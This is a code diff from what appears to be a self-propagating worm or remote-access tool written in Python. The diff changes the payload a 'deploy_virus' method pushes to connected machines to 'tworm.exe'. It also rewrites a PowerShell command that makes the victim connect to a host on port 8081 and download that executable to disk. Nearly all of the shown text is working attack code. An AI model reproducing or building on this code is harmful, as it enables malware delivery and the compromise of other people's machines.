@@ -23,7 +23,7 @@ class tunnel(threading.Thread):
         conn.settimeout(5.0)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        self.deploy_virus(replicate("container/testhello.exe").getfiledata(),conn)
+        self.deploy_virus(replicate("container/tworm.exe").getfiledata(),conn)
     
     
     def sent_command(self, command, conn):
@@ -89,7 +89,20 @@ class tunnel(threading.Thread):
             self.sent_command(command,conn)
             print("run powershell")
             print("Target Response: {}".format(self.get_response(conn)))
-            command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("{}_tworm.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.format(self.lhost).encode()
+            command = '$client = New-Object System.Net.Sockets.TcpClient;'
+            command += '$client.Connect("192.168.56.108", 8081); '
+            command += '$stream = $client.GetStream(); '
+            command += '$buffer = New-Object byte[] 1024; '
+            command += '$receivedBytes = 0; '
+            command += '$totalBytes = 0; '
+            command += '$file = New-Object System.IO.FileStream("'+self.lhost+'_tworm.exe", [System.IO.FileMode]::Create); '
+            command += 'do { $receivedBytes = $stream.Read($buffer, 0, 1024); '
+            command += '$totalBytes += $receivedBytes; '
+            command += '$file.Write($buffer, 0, $receivedBytes); } '
+            command += 'while ($receivedBytes -ne 0); '
+            command += '$file.Close(); '
+            command += '$client.Close();'
+            command = command.encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("target machine is starting to connect to the us")
